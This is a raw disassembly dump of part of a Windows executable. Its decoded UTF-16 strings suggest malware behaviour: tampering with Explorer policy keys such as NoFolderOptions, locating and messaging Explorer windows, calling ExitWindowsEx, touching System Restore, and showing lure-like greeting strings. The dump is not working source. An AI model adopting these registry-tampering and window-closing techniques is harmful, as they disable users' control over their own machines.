  408605:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408609:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40860d:	00 00                	add    %al,(%eax)
  40860f:	00 10                	add    %dl,(%eax)
  408611:	00 00                	add    %al,(%eax)
  408613:	00 46 00             	add    %al,0x0(%esi)
  408616:	75 00                	jne    0x408618
  408618:	6c                   	insb   (%dx),%es:(%edi)
  408619:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40861d:	00 61 00             	add    %ah,0x0(%ecx)
  408620:	74 00                	je     0x408622
  408622:	68 00 00 00 00       	push   $0x0
  408627:	00 02                	add    %al,(%edx)
  408629:	00 00                	add    %al,(%eax)
  40862b:	00 31                	add    %dh,(%ecx)
  40862d:	00 00                	add    %al,(%eax)
  40862f:	00 76 00             	add    %dh,0x0(%esi)
  408632:	00 00                	add    %al,(%eax)
  408634:	53                   	push   %ebx
  408635:	00 4f 00             	add    %cl,0x0(%edi)
  408638:	46                   	inc    %esi
  408639:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40863d:	00 41 00             	add    %al,0x0(%ecx)
  408640:	52                   	push   %edx
  408641:	00 45 00             	add    %al,0x0(%ebp)
  408644:	5c                   	pop    %esp
  408645:	00 4d 00             	add    %cl,0x0(%ebp)
  408648:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40864e:	6f                   	outsl  %ds:(%esi),(%dx)
  40864f:	00 73 00             	add    %dh,0x0(%ebx)
  408652:	6f                   	outsl  %ds:(%esi),(%dx)
  408653:	00 66 00             	add    %ah,0x0(%esi)
  408656:	74 00                	je     0x408658
  408658:	5c                   	pop    %esp
  408659:	00 57 00             	add    %dl,0x0(%edi)
  40865c:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  408662:	6f                   	outsl  %ds:(%esi),(%dx)
  408663:	00 77 00             	add    %dh,0x0(%edi)
  408666:	73 00                	jae    0x408668
  408668:	5c                   	pop    %esp
  408669:	00 43 00             	add    %al,0x0(%ebx)
  40866c:	75 00                	jne    0x40866e
  40866e:	72 00                	jb     0x408670
  408670:	72 00                	jb     0x408672
  408672:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408676:	74 00                	je     0x408678
  408678:	56                   	push   %esi
  408679:	00 65 00             	add    %ah,0x0(%ebp)
  40867c:	72 00                	jb     0x40867e
  40867e:	73 00                	jae    0x408680
  408680:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408686:	5c                   	pop    %esp
  408687:	00 45 00             	add    %al,0x0(%ebp)
  40868a:	78 00                	js     0x40868c
  40868c:	70 00                	jo     0x40868e
  40868e:	6c                   	insb   (%dx),%es:(%edi)
  40868f:	00 6f 00             	add    %ch,0x0(%edi)
  408692:	72 00                	jb     0x408694
  408694:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408698:	5c                   	pop    %esp
  408699:	00 41 00             	add    %al,0x0(%ecx)
  40869c:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  4086a0:	61                   	popa
  4086a1:	00 6e 00             	add    %ch,0x0(%esi)
  4086a4:	63 00                	arpl   %eax,(%eax)
  4086a6:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4086ab:	00 02                	add    %al,(%edx)
  4086ad:	00 00                	add    %al,(%eax)
  4086af:	00 32                	add    %dh,(%edx)
  4086b1:	00 00                	add    %al,(%eax)
  4086b3:	00 76 00             	add    %dh,0x0(%esi)
  4086b6:	00 00                	add    %al,(%eax)
  4086b8:	53                   	push   %ebx
  4086b9:	00 6f 00             	add    %ch,0x0(%edi)
  4086bc:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4086c1:	00 61 00             	add    %ah,0x0(%ecx)
  4086c4:	72 00                	jb     0x4086c6
  4086c6:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4086cb:	00 69 00             	add    %ch,0x0(%ecx)
  4086ce:	63 00                	arpl   %eax,(%eax)
  4086d0:	72 00                	jb     0x4086d2
  4086d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d3:	00 73 00             	add    %dh,0x0(%ebx)
  4086d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d7:	00 66 00             	add    %ah,0x0(%esi)
  4086da:	74 00                	je     0x4086dc
  4086dc:	5c                   	pop    %esp
  4086dd:	00 57 00             	add    %dl,0x0(%edi)
  4086e0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4086e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e7:	00 77 00             	add    %dh,0x0(%edi)
  4086ea:	73 00                	jae    0x4086ec
  4086ec:	5c                   	pop    %esp
  4086ed:	00 43 00             	add    %al,0x0(%ebx)
  4086f0:	75 00                	jne    0x4086f2
  4086f2:	72 00                	jb     0x4086f4
  4086f4:	72 00                	jb     0x4086f6
  4086f6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4086fa:	74 00                	je     0x4086fc
  4086fc:	56                   	push   %esi
  4086fd:	00 65 00             	add    %ah,0x0(%ebp)
  408700:	72 00                	jb     0x408702
  408702:	73 00                	jae    0x408704
  408704:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40870a:	5c                   	pop    %esp
  40870b:	00 50 00             	add    %dl,0x0(%eax)
  40870e:	6f                   	outsl  %ds:(%esi),(%dx)
  40870f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408713:	00 63 00             	add    %ah,0x0(%ebx)
  408716:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40871c:	5c                   	pop    %esp
  40871d:	00 45 00             	add    %al,0x0(%ebp)
  408720:	78 00                	js     0x408722
  408722:	70 00                	jo     0x408724
  408724:	6c                   	insb   (%dx),%es:(%edi)
  408725:	00 6f 00             	add    %ch,0x0(%edi)
  408728:	72 00                	jb     0x40872a
  40872a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40872e:	00 00                	add    %al,(%eax)
  408730:	1e                   	push   %ds
  408731:	00 00                	add    %al,(%eax)
  408733:	00 4e 00             	add    %cl,0x0(%esi)
  408736:	6f                   	outsl  %ds:(%esi),(%dx)
  408737:	00 46 00             	add    %al,0x0(%esi)
  40873a:	6f                   	outsl  %ds:(%esi),(%dx)
  40873b:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40873f:	00 65 00             	add    %ah,0x0(%ebp)
  408742:	72 00                	jb     0x408744
  408744:	4f                   	dec    %edi
  408745:	00 70 00             	add    %dh,0x0(%eax)
  408748:	74 00                	je     0x40874a
  40874a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408750:	73 00                	jae    0x408752
  408752:	00 00                	add    %al,(%eax)
  408754:	74 00                	je     0x408756
  408756:	00 00                	add    %al,(%eax)
  408758:	53                   	push   %ebx
  408759:	00 6f 00             	add    %ch,0x0(%edi)
  40875c:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  408761:	00 61 00             	add    %ah,0x0(%ecx)
  408764:	72 00                	jb     0x408766
  408766:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40876b:	00 69 00             	add    %ch,0x0(%ecx)
  40876e:	63 00                	arpl   %eax,(%eax)
  408770:	72 00                	jb     0x408772
  408772:	6f                   	outsl  %ds:(%esi),(%dx)
  408773:	00 73 00             	add    %dh,0x0(%ebx)
  408776:	6f                   	outsl  %ds:(%esi),(%dx)
  408777:	00 66 00             	add    %ah,0x0(%esi)
  40877a:	74 00                	je     0x40877c
  40877c:	5c                   	pop    %esp
  40877d:	00 57 00             	add    %dl,0x0(%edi)
  408780:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  408786:	6f                   	outsl  %ds:(%esi),(%dx)
  408787:	00 77 00             	add    %dh,0x0(%edi)
  40878a:	73 00                	jae    0x40878c
  40878c:	5c                   	pop    %esp
  40878d:	00 43 00             	add    %al,0x0(%ebx)
  408790:	75 00                	jne    0x408792
  408792:	72 00                	jb     0x408794
  408794:	72 00                	jb     0x408796
  408796:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40879a:	74 00                	je     0x40879c
  40879c:	56                   	push   %esi
  40879d:	00 65 00             	add    %ah,0x0(%ebp)
  4087a0:	72 00                	jb     0x4087a2
  4087a2:	73 00                	jae    0x4087a4
  4087a4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4087aa:	5c                   	pop    %esp
  4087ab:	00 45 00             	add    %al,0x0(%ebp)
  4087ae:	78 00                	js     0x4087b0
  4087b0:	70 00                	jo     0x4087b2
  4087b2:	6c                   	insb   (%dx),%es:(%edi)
  4087b3:	00 6f 00             	add    %ch,0x0(%edi)
  4087b6:	72 00                	jb     0x4087b8
  4087b8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4087bc:	5c                   	pop    %esp
  4087bd:	00 53 00             	add    %dl,0x0(%ebx)
  4087c0:	74 00                	je     0x4087c2
  4087c2:	72 00                	jb     0x4087c4
  4087c4:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4087c8:	6d                   	insl   (%dx),%es:(%edi)
  4087c9:	00 73 00             	add    %dh,0x0(%ebx)
  4087cc:	00 00                	add    %al,(%eax)
  4087ce:	00 00                	add    %al,(%eax)
  4087d0:	10 00                	adc    %al,(%eax)
  4087d2:	00 00                	add    %al,(%eax)
  4087d4:	53                   	push   %ebx
  4087d5:	00 65 00             	add    %ah,0x0(%ebp)
  4087d8:	74 00                	je     0x4087da
  4087da:	74 00                	je     0x4087dc
  4087dc:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4087e2:	73 00                	jae    0x4087e4
  4087e4:	00 00                	add    %al,(%eax)
  4087e6:	00 00                	add    %al,(%eax)
  4087e8:	34 00                	xor    $0x0,%al
  4087ea:	00 00                	add    %al,(%eax)
  4087ec:	53                   	push   %ebx
  4087ed:	00 63 00             	add    %ah,0x0(%ebx)
  4087f0:	72 00                	jb     0x4087f2
  4087f2:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4087f8:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4087fe:	2e 00 46 00          	add    %al,%cs:0x0(%esi)
  408802:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  408808:	53                   	push   %ebx
  408809:	00 79 00             	add    %bh,0x0(%ecx)
  40880c:	73 00                	jae    0x40880e
  40880e:	74 00                	je     0x408810
  408810:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408814:	4f                   	dec    %edi
  408815:	00 62 00             	add    %ah,0x0(%edx)
  408818:	6a 00                	push   $0x0
  40881a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40881e:	74 00                	je     0x408820
  408820:	00 00                	add    %al,(%eax)
  408822:	00 00                	add    %al,(%eax)
  408824:	43                   	inc    %ebx
  408825:	00 72 00             	add    %dh,0x0(%edx)
  408828:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40882c:	74 00                	je     0x40882e
  40882e:	65 00 54 00 65       	add    %dl,%gs:0x65(%eax,%eax,1)
  408833:	00 78 00             	add    %bh,0x0(%eax)
  408836:	74 00                	je     0x408838
  408838:	46                   	inc    %esi
  408839:	00 69 00             	add    %ch,0x0(%ecx)
  40883c:	6c                   	insb   (%dx),%es:(%edi)
  40883d:	00 65 00             	add    %ah,0x0(%ebp)
  408840:	00 00                	add    %al,(%eax)
  408842:	00 00                	add    %al,(%eax)
  408844:	57                   	push   %edi
  408845:	00 72 00             	add    %dh,0x0(%edx)
  408848:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40884e:	00 00                	add    %al,(%eax)
  408850:	43                   	inc    %ebx
  408851:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  408855:	00 73 00             	add    %dh,0x0(%ebx)
  408858:	65 00 00             	add    %al,%gs:(%eax)
  40885b:	00 10                	add    %dl,(%eax)
  40885d:	00 00                	add    %al,(%eax)
  40885f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408863:	00 6d 00             	add    %ch,0x0(%ebp)
  408866:	70 00                	jo     0x408868
  408868:	2e 00 7a 00          	add    %bh,%cs:0x0(%edx)
  40886c:	69 00 70 00 00 00    	imul   $0x70,(%eax),%eax
  408872:	00 00                	add    %al,(%eax)
  408874:	22 00                	and    (%eax),%al
  408876:	00 00                	add    %al,(%eax)
  408878:	53                   	push   %ebx
  408879:	00 68 00             	add    %ch,0x0(%eax)
  40887c:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  408881:	00 2e                	add    %ch,(%esi)
  408883:	00 41 00             	add    %al,0x0(%ecx)
  408886:	70 00                	jo     0x408888
  408888:	70 00                	jo     0x40888a
  40888a:	6c                   	insb   (%dx),%es:(%edi)
  40888b:	00 69 00             	add    %ch,0x0(%ecx)
  40888e:	63 00                	arpl   %eax,(%eax)
  408890:	61                   	popa
  408891:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408895:	00 6f 00             	add    %ch,0x0(%edi)
  408898:	6e                   	outsb  %ds:(%esi),(%dx)
  408899:	00 00                	add    %al,(%eax)
  40889b:	00 4e 00             	add    %cl,0x0(%esi)
  40889e:	61                   	popa
  40889f:	00 6d 00             	add    %ch,0x0(%ebp)
  4088a2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4088a6:	70 00                	jo     0x4088a8
  4088a8:	61                   	popa
  4088a9:	00 63 00             	add    %ah,0x0(%ebx)
  4088ac:	65 00 00             	add    %al,%gs:(%eax)
  4088af:	00 43 00             	add    %al,0x0(%ebx)
  4088b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b3:	00 70 00             	add    %dh,0x0(%eax)
  4088b6:	79 00                	jns    0x4088b8
  4088b8:	48                   	dec    %eax
  4088b9:	00 65 00             	add    %ah,0x0(%ebp)
  4088bc:	72 00                	jb     0x4088be
  4088be:	65 00 00             	add    %al,%gs:(%eax)
  4088c1:	00 00                	add    %al,(%eax)
  4088c3:	00 a0 83 40 00 10    	add    %ah,0x10004083(%eax)
  4088c9:	80 40 00 00          	addb   $0x0,0x0(%eax)
  4088cd:	00 04 00             	add    %al,(%eax,%eax,1)
  4088d0:	14 c8                	adc    $0xc8,%al
  4088d2:	40                   	inc    %eax
	...
  4088db:	00 a1 1c c8 40 00    	add    %ah,0x40c81c(%ecx)
  4088e1:	0b c0                	or     %eax,%eax
  4088e3:	74 02                	je     0x4088e7
  4088e5:	ff e0                	jmp    *%eax
  4088e7:	68 c4 88 40 00       	push   $0x4088c4
  4088ec:	b8 90 10 40 00       	mov    $0x401090,%eax
  4088f1:	ff d0                	call   *%eax
  4088f3:	ff e0                	jmp    *%eax
  4088f5:	00 00                	add    %al,(%eax)
  4088f7:	00 0e                	add    %cl,(%esi)
  4088f9:	00 00                	add    %al,(%eax)
  4088fb:	00 46 69             	add    %al,0x69(%esi)
  4088fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ff:	64 57                	fs push %edi
  408901:	69 6e 64 6f 77 45 78 	imul   $0x7845776f,0x64(%esi),%ebp
  408908:	41                   	inc    %ecx
  408909:	00 00                	add    %al,(%eax)
  40890b:	00 a0 83 40 00 fc    	add    %ah,-0x3ffbf7d(%eax)
  408911:	88 40 00             	mov    %al,0x0(%eax)
  408914:	00 00                	add    %al,(%eax)
  408916:	04 00                	add    $0x0,%al
  408918:	20 c8                	and    %cl,%al
  40891a:	40                   	inc    %eax
	...
  408923:	00 a1 28 c8 40 00    	add    %ah,0x40c828(%ecx)
  408929:	0b c0                	or     %eax,%eax
  40892b:	74 02                	je     0x40892f
  40892d:	ff e0                	jmp    *%eax
  40892f:	68 0c 89 40 00       	push   $0x40890c
  408934:	b8 90 10 40 00       	mov    $0x401090,%eax
  408939:	ff d0                	call   *%eax
  40893b:	ff e0                	jmp    *%eax
  40893d:	00 00                	add    %al,(%eax)
  40893f:	00 0d 00 00 00 53    	add    %cl,0x53000000
  408945:	65 6e                	outsb  %gs:(%esi),(%dx)
  408947:	64 4d                	fs dec %ebp
  408949:	65 73 73             	gs jae 0x4089bf
  40894c:	61                   	popa
  40894d:	67 65 41             	addr16 gs inc %ecx
  408950:	00 00                	add    %al,(%eax)
  408952:	00 00                	add    %al,(%eax)
  408954:	a0 83 40 00 44       	mov    0x44004083,%al
  408959:	89 40 00             	mov    %eax,0x0(%eax)
  40895c:	00 00                	add    %al,(%eax)
  40895e:	04 00                	add    $0x0,%al
  408960:	2c c8                	sub    $0xc8,%al
  408962:	40                   	inc    %eax
	...
  40896b:	00 a1 34 c8 40 00    	add    %ah,0x40c834(%ecx)
  408971:	0b c0                	or     %eax,%eax
  408973:	74 02                	je     0x408977
  408975:	ff e0                	jmp    *%eax
  408977:	68 54 89 40 00       	push   $0x408954
  40897c:	b8 90 10 40 00       	mov    $0x401090,%eax
  408981:	ff d0                	call   *%eax
  408983:	ff e0                	jmp    *%eax
  408985:	00 00                	add    %al,(%eax)
  408987:	00 0d 00 00 00 50    	add    %cl,0x50000000
  40898d:	6f                   	outsl  %ds:(%esi),(%dx)
  40898e:	73 74                	jae    0x408a04
  408990:	4d                   	dec    %ebp
  408991:	65 73 73             	gs jae 0x408a07
  408994:	61                   	popa
  408995:	67 65 41             	addr16 gs inc %ecx
  408998:	00 00                	add    %al,(%eax)
  40899a:	00 00                	add    %al,(%eax)
  40899c:	a0 83 40 00 8c       	mov    0x8c004083,%al
  4089a1:	89 40 00             	mov    %eax,0x0(%eax)
  4089a4:	00 00                	add    %al,(%eax)
  4089a6:	04 00                	add    $0x0,%al
  4089a8:	38 c8                	cmp    %cl,%al
  4089aa:	40                   	inc    %eax
	...
  4089b3:	00 a1 40 c8 40 00    	add    %ah,0x40c840(%ecx)
  4089b9:	0b c0                	or     %eax,%eax
  4089bb:	74 02                	je     0x4089bf
  4089bd:	ff e0                	jmp    *%eax
  4089bf:	68 9c 89 40 00       	push   $0x40899c
  4089c4:	b8 90 10 40 00       	mov    $0x401090,%eax
  4089c9:	ff d0                	call   *%eax
  4089cb:	ff e0                	jmp    *%eax
  4089cd:	00 00                	add    %al,(%eax)
  4089cf:	00 13                	add    %dl,(%ebx)
  4089d1:	00 00                	add    %al,(%eax)
  4089d3:	00 47 65             	add    %al,0x65(%edi)
  4089d6:	74 46                	je     0x408a1e
  4089d8:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  4089df:	69 
  4089e0:	62 75 74             	bound  %esi,0x74(%ebp)
  4089e3:	65 73 41             	gs jae 0x408a27
  4089e6:	00 00                	add    %al,(%eax)
  4089e8:	d8 7c 40 00          	fdivrs 0x0(%eax,%eax,2)
  4089ec:	d4 89                	aam    $0x89
  4089ee:	40                   	inc    %eax
  4089ef:	00 00                	add    %al,(%eax)
  4089f1:	00 04 00             	add    %al,(%eax,%eax,1)
  4089f4:	44                   	inc    %esp
  4089f5:	c8 40 00 00          	enter  $0x40,$0x0
  4089f9:	00 00                	add    %al,(%eax)
  4089fb:	00 00                	add    %al,(%eax)
  4089fd:	00 00                	add    %al,(%eax)
  4089ff:	00 a1 4c c8 40 00    	add    %ah,0x40c84c(%ecx)
  408a05:	0b c0                	or     %eax,%eax
  408a07:	74 02                	je     0x408a0b
  408a09:	ff e0                	jmp    *%eax
  408a0b:	68 e8 89 40 00       	push   $0x4089e8
  408a10:	b8 90 10 40 00       	mov    $0x401090,%eax
  408a15:	ff d0                	call   *%eax
  408a17:	ff e0                	jmp    *%eax
  408a19:	00 00                	add    %al,(%eax)
  408a1b:	00 0e                	add    %cl,(%esi)
  408a1d:	00 00                	add    %al,(%eax)
  408a1f:	00 45 78             	add    %al,0x78(%ebp)
  408a22:	69 74 57 69 6e 64 6f 	imul   $0x776f646e,0x69(%edi,%edx,2),%esi
  408a29:	77 
  408a2a:	73 45                	jae    0x408a71
  408a2c:	78 00                	js     0x408a2e
  408a2e:	00 00                	add    %al,(%eax)
  408a30:	a0 83 40 00 20       	mov    0x20004083,%al
  408a35:	8a 40 00             	mov    0x0(%eax),%al
  408a38:	00 00                	add    %al,(%eax)
  408a3a:	04 00                	add    $0x0,%al
  408a3c:	50                   	push   %eax
  408a3d:	c8 40 00 00          	enter  $0x40,$0x0
  408a41:	00 00                	add    %al,(%eax)
  408a43:	00 00                	add    %al,(%eax)
  408a45:	00 00                	add    %al,(%eax)
  408a47:	00 a1 58 c8 40 00    	add    %ah,0x40c858(%ecx)
  408a4d:	0b c0                	or     %eax,%eax
  408a4f:	74 02                	je     0x408a53
  408a51:	ff e0                	jmp    *%eax
  408a53:	68 30 8a 40 00       	push   $0x408a30
  408a58:	b8 90 10 40 00       	mov    $0x401090,%eax
  408a5d:	ff d0                	call   *%eax
  408a5f:	ff e0                	jmp    *%eax
  408a61:	00 00                	add    %al,(%eax)
  408a63:	00 0f                	add    %cl,(%edi)
  408a65:	00 00                	add    %al,(%eax)
  408a67:	00 47 65             	add    %al,0x65(%edi)
  408a6a:	74 57                	je     0x408ac3
  408a6c:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408a73:	78 74                	js     0x408ae9
  408a75:	41                   	inc    %ecx
  408a76:	00 00                	add    %al,(%eax)
  408a78:	a0 83 40 00 68       	mov    0x68004083,%al
  408a7d:	8a 40 00             	mov    0x0(%eax),%al
  408a80:	00 00                	add    %al,(%eax)
  408a82:	04 00                	add    $0x0,%al
  408a84:	5c                   	pop    %esp
  408a85:	c8 40 00 00          	enter  $0x40,$0x0
  408a89:	00 00                	add    %al,(%eax)
  408a8b:	00 00                	add    %al,(%eax)
  408a8d:	00 00                	add    %al,(%eax)
  408a8f:	00 a1 64 c8 40 00    	add    %ah,0x40c864(%ecx)
  408a95:	0b c0                	or     %eax,%eax
  408a97:	74 02                	je     0x408a9b
  408a99:	ff e0                	jmp    *%eax
  408a9b:	68 78 8a 40 00       	push   $0x408a78
  408aa0:	b8 90 10 40 00       	mov    $0x401090,%eax
  408aa5:	ff d0                	call   *%eax
  408aa7:	ff e0                	jmp    *%eax
  408aa9:	00 00                	add    %al,(%eax)
  408aab:	00 15 00 00 00 47    	add    %dl,0x47000000
  408ab1:	65 74 57             	gs je  0x408b0b
  408ab4:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408abb:	78 74                	js     0x408b31
  408abd:	4c                   	dec    %esp
  408abe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ac0:	67 74 68             	addr16 je 0x408b2b
  408ac3:	41                   	inc    %ecx
  408ac4:	00 00                	add    %al,(%eax)
  408ac6:	00 00                	add    %al,(%eax)
  408ac8:	a0 83 40 00 b0       	mov    0xb0004083,%al
  408acd:	8a 40 00             	mov    0x0(%eax),%al
  408ad0:	00 00                	add    %al,(%eax)
  408ad2:	04 00                	add    $0x0,%al
  408ad4:	68 c8 40 00 00       	push   $0x40c8
  408ad9:	00 00                	add    %al,(%eax)
  408adb:	00 00                	add    %al,(%eax)
  408add:	00 00                	add    %al,(%eax)
  408adf:	00 a1 70 c8 40 00    	add    %ah,0x40c870(%ecx)
  408ae5:	0b c0                	or     %eax,%eax
  408ae7:	74 02                	je     0x408aeb
  408ae9:	ff e0                	jmp    *%eax
  408aeb:	68 c8 8a 40 00       	push   $0x408ac8
  408af0:	b8 90 10 40 00       	mov    $0x401090,%eax
  408af5:	ff d0                	call   *%eax
  408af7:	ff e0                	jmp    *%eax
  408af9:	00 00                	add    %al,(%eax)
  408afb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408afe:	00 00                	add    %al,(%eax)
  408b00:	62 00                	bound  %eax,(%eax)
  408b02:	61                   	popa
  408b03:	00 63 00             	add    %ah,0x0(%ebx)
  408b06:	6b 00 75             	imul   $0x75,(%eax),%eax
  408b09:	00 70 00             	add    %dh,0x0(%eax)
  408b0c:	00 00                	add    %al,(%eax)
  408b0e:	00 00                	add    %al,(%eax)
  408b10:	08 00                	or     %al,(%eax)
  408b12:	00 00                	add    %al,(%eax)
  408b14:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408b18:	74 00                	je     0x408b1a
  408b1a:	61                   	popa
  408b1b:	00 00                	add    %al,(%eax)
  408b1d:	00 00                	add    %al,(%eax)
  408b1f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  408b22:	00 00                	add    %al,(%eax)
  408b24:	53                   	push   %ebx
  408b25:	00 79 00             	add    %bh,0x0(%ecx)
  408b28:	73 00                	jae    0x408b2a
  408b2a:	74 00                	je     0x408b2c
  408b2c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408b30:	20 00                	and    %al,(%eax)
  408b32:	52                   	push   %edx
  408b33:	00 65 00             	add    %ah,0x0(%ebp)
  408b36:	73 00                	jae    0x408b38
  408b38:	74 00                	je     0x408b3a
  408b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3b:	00 72 00             	add    %dh,0x0(%edx)
  408b3e:	65 00 00             	add    %al,%gs:(%eax)
  408b41:	00 00                	add    %al,(%eax)
  408b43:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408b46:	00 00                	add    %al,(%eax)
  408b48:	75 00                	jne    0x408b4a
  408b4a:	70 00                	jo     0x408b4c
  408b4c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408b50:	74 00                	je     0x408b52
  408b52:	65 00 00             	add    %al,%gs:(%eax)
  408b55:	00 00                	add    %al,(%eax)
  408b57:	00 02                	add    %al,(%edx)
  408b59:	00 00                	add    %al,(%eax)
  408b5b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408b5e:	00 00                	add    %al,(%eax)
  408b60:	02 00                	add    (%eax),%al
  408b62:	00 00                	add    %al,(%eax)
  408b64:	2a 00                	sub    (%eax),%al
  408b66:	00 00                	add    %al,(%eax)
  408b68:	16                   	push   %ss
  408b69:	00 00                	add    %al,(%eax)
  408b6b:	00 04 00             	add    %al,(%eax,%eax,1)
  408b6e:	00 00                	add    %al,(%eax)
  408b70:	01 00                	add    %eax,(%eax)
	...
  408b7a:	73 01                	jae    0x408b7d
  408b7c:	ff                   	(bad)
  408b7d:	ff                   	(bad)
  408b7e:	ff                   	(bad)
  408b7f:	ff 01                	incl   (%ecx)
  408b81:	00 00                	add    %al,(%eax)
  408b83:	00 1a                	add    %bl,(%edx)
  408b85:	00 00                	add    %al,(%eax)
  408b87:	00 43 00             	add    %al,0x0(%ebx)
  408b8a:	61                   	popa
  408b8b:	00 62 00             	add    %ah,0x0(%edx)
  408b8e:	69 00 6e 00 65 00    	imul   $0x65006e,(%eax),%eax
  408b94:	74 00                	je     0x408b96
  408b96:	57                   	push   %edi
  408b97:	00 43 00             	add    %al,0x0(%ebx)
  408b9a:	6c                   	insb   (%dx),%es:(%edi)
  408b9b:	00 61 00             	add    %ah,0x0(%ecx)
  408b9e:	73 00                	jae    0x408ba0
  408ba0:	73 00                	jae    0x408ba2
  408ba2:	00 00                	add    %al,(%eax)
  408ba4:	1a 00                	sbb    (%eax),%al
  408ba6:	00 00                	add    %al,(%eax)
  408ba8:	45                   	inc    %ebp
  408ba9:	00 78 00             	add    %bh,0x0(%eax)
  408bac:	70 00                	jo     0x408bae
  408bae:	6c                   	insb   (%dx),%es:(%edi)
  408baf:	00 6f 00             	add    %ch,0x0(%edi)
  408bb2:	72 00                	jb     0x408bb4
  408bb4:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  408bb8:	43                   	inc    %ebx
  408bb9:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  408bbd:	00 73 00             	add    %dh,0x0(%ebx)
  408bc0:	73 00                	jae    0x408bc2
  408bc2:	00 00                	add    %al,(%eax)
  408bc4:	30 00                	xor    %al,(%eax)
  408bc6:	00 00                	add    %al,(%eax)
  408bc8:	48                   	dec    %eax
  408bc9:	00 61 00             	add    %ah,0x0(%ecx)
  408bcc:	70 00                	jo     0x408bce
  408bce:	70 00                	jo     0x408bd0
  408bd0:	79 00                	jns    0x408bd2
  408bd2:	20 00                	and    %al,(%eax)
  408bd4:	42                   	inc    %edx
  408bd5:	00 69 00             	add    %ch,0x0(%ecx)
  408bd8:	72 00                	jb     0x408bda
  408bda:	74 00                	je     0x408bdc
  408bdc:	68 00 44 00 61       	push   $0x61004400
  408be1:	00 79 00             	add    %bh,0x0(%ecx)
  408be4:	20 00                	and    %al,(%eax)
  408be6:	6d                   	insl   (%dx),%es:(%edi)
  408be7:	00 79 00             	add    %bh,0x0(%ecx)
  408bea:	27                   	daa
  408beb:	00 73 00             	add    %dh,0x0(%ebx)
  408bee:	20 00                	and    %al,(%eax)
  408bf0:	42                   	inc    %edx
  408bf1:	00 6f 00             	add    %ch,0x0(%edi)
  408bf4:	73 00                	jae    0x408bf6
  408bf6:	73 00                	jae    0x408bf8
  408bf8:	00 00                	add    %al,(%eax)
  408bfa:	00 00                	add    %al,(%eax)
  408bfc:	1e                   	push   %ds
  408bfd:	00 00                	add    %al,(%eax)
  408bff:	00 4d 00             	add    %cl,0x0(%ebp)
  408c02:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408c06:	72 00                	jb     0x408c08
  408c08:	79 00                	jns    0x408c0a
  408c0a:	20 00                	and    %al,(%eax)
  408c0c:	43                   	inc    %ebx
  408c0d:	00 68 00             	add    %ch,0x0(%eax)
  408c10:	72 00                	jb     0x408c12
  408c12:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  408c18:	6d                   	insl   (%dx),%es:(%edi)
  408c19:	00 61 00             	add    %ah,0x0(%ecx)
  408c1c:	73 00                	jae    0x408c1e
	...
  408c36:	00 00                	add    %al,(%eax)
